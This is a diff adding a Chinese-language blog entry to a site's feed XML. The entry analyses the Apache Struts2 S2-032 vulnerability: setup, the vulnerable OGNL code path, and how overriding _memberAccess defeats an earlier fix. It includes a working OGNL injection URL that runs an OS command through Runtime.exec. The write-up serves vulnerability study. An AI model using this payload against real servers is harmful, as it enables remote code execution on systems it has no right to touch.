@@ -4,6 +4,25 @@
   
   
   <entry>
+    <title>struts2系列漏洞 S2-032</title>
+    <link href="/2020/07/28/struts2%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E-S2-032/"/>
+    <url>/2020/07/28/struts2%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E-S2-032/</url>
+    
+    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>  经典 Java 软件漏洞 struts 系列，准备一个个看过去。</p><a id="more"></a><hr><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>2.3.28 版本的 struts2 + Tomcat 9。</p><p>修改 struts.xml，打开动态方法调用：</p><pre><code class="xml">&lt;constant name=&quot;struts.enable.DynamicMethodInvocation&quot; value=&quot;true&quot; /&gt;</code></pre><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>根据<a href="https://cwiki.apache.org/confluence/display/WW/S2-032" target="_blank" rel="noopener">官方通告</a>，可以看出漏洞原因是在动态方法调用开启的情况下，会将 method: 前缀的参数作为表达式来执行，我们先看看 method: 前缀参数的 put 方法：</p><pre><code class="java">put(METHOD_PREFIX, new ParameterAction() {    public void execute(String key, ActionMapping mapping) {        if (allowDynamicMethodCalls) {            mapping.setMethod(key.substring(METHOD_PREFIX.length()));        }    }});</code></pre><p>在 DynamicMethodInvocation 开启的情况下，会不经过滤将 method: 前缀参数放入 mapping 中。在 Dispatcher 类的 serviceAction 函数用其创建代理之后，会执行到 DefaultActionInvocation 类的 invokeAction 函数中：</p><pre><code class="java">protected String invokeAction(Object action, ActionConfig actionConfig) throws Exception {    String methodName = proxy.getMethod();    if (LOG.isDebugEnabled()) {        LOG.debug(&quot;Executing action method = #0&quot;, methodName);    }    String timerKey = &quot;invokeAction: &quot; + proxy.getActionName();    try {        UtilTimerStack.push(timerKey);        Object methodResult;        try {            methodResult = ognlUtil.getValue(methodName + &quot;()&quot;, getStack().getContext(), action);        }         ...    }    ...}</code></pre><p>将参数值作为表达式解析。</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>因为 2.3.20 版本的修复中禁止了 new 和反射，所以通过修改用于安全检测的 _memberAccess 属性，将之变为实现了 memberAccess 接口的另一个类 DefaultMemberAccess，它的 isAccessible 函数如下：</p><pre><code class="java">public boolean isAccessible(Map context, Object target, Member member, String propertyName){    int         modifiers = member.getModifiers();    boolean     result = Modifier.isPublic(modifiers);    if (!result) {        if (Modifier.isPrivate(modifiers)) {            result = getAllowPrivateAccess();        } else {            if (Modifier.isProtected(modifiers)) {                result = getAllowProtectedAccess();            } else {                result = getAllowPackageProtectedAccess();            }        }    }    return result;}</code></pre><p>可以看到，对 public 函数调用没有任何限制，而 OgnlContext 中恰好有这么一个静态属性：</p><pre><code class="java">public static final MemberAccess DEFAULT_MEMBER_ACCESS = new DefaultMemberAccess(false);</code></pre><p>payload 如下：</p><pre><code>http://localhost:8080/login.action?method:(%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,@java.lang.Runtime@getRuntime().exec(%23parameters.c%5b0%5d)).toString&amp;a=xwork.MethodAccessor.denyMethodExecution&amp;b=allowStaticMethodAccess&amp;c=calc</code></pre><h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>给 method: 前缀的参数值加上了前面 actionName 的过滤。</p><hr><p>参考文章：</p><p><a href="https://www.cnblogs.com/mrchang/p/6501428.html" target="_blank" rel="noopener">https://www.cnblogs.com/mrchang/p/6501428.html</a></p>]]></content>
+    
+    
+    
+    <tags>
+      
+      <tag>Web</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>struts2系列漏洞 S2-031</title>
     <link href="/2020/07/27/struts2%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E-S2-031/"/>
     <url>/2020/07/27/struts2%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E-S2-031/</url>
